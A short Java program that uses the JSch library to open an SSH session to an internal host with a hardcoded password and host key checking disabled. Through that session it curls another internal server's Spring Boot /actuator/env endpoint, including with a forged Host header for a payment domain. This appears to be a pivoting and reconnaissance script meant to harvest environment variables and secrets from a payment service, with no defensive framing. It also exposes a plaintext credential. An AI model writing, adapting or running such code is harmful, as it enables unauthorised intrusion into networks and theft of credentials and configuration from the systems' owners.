import com.jcraft.jsch.*;
import java.io.*;
class SSZ4 {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session s = j.getSession("user", "10.14.36.23", 22);
    s.setPassword("kutul0nc4t");
    s.setConfig(p);
    s.setTimeout(10000);
    s.connect();
    ChannelExec ch = (ChannelExec) s.openChannel("exec");
    ch.setCommand("echo ---51-ROOT---;curl -sk --max-time 5 https://10.14.16.51/ 2>/dev/null | head -5;echo ---51-ACTUATOR---;curl -sk --max-time 5 https://10.14.16.51/actuator/env 2>/dev/null | head -50;echo ---51-NEO---;curl -sk --max-time 5 -H 'Host: payment.accurate.id' https://10.14.16.51/actuator/env 2>/dev/null | head -50");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[8192];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    s.disconnect();
  }
}
